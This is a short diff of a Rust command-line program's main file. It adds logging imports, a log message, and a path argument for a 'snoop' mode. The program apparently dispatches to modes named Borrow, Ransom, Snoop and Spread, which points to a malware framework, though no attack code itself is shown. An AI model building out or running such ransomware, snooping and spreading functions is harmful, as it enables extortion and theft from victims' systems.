@@ -1,5 +1,9 @@
+use std::path::PathBuf;
+
 use clap::{Parser, Subcommand};
 use config::{Config, ConfigError, File, FileFormat};
+use env_logger::{fmt::Target, Builder};
+use log::{debug, error, info, log_enabled, LevelFilter};
 
 mod borrow;
 mod ransom;
@@ -66,9 +70,11 @@ fn main() {
         match mode {
             Modes::Borrow => borrow(),
             Modes::Ransom => ransom(),
-            Modes::Snoop => snoop(),
+            Modes::Snoop => snoop(Some(PathBuf::from("./sys.json"))),
             Modes::Spread => spread(),
-            _ => unreachable!(),
+            _ => unreachable!(), // panics if code becomes not unreachable
         }
     };
+
+    info!("finished!");
 }
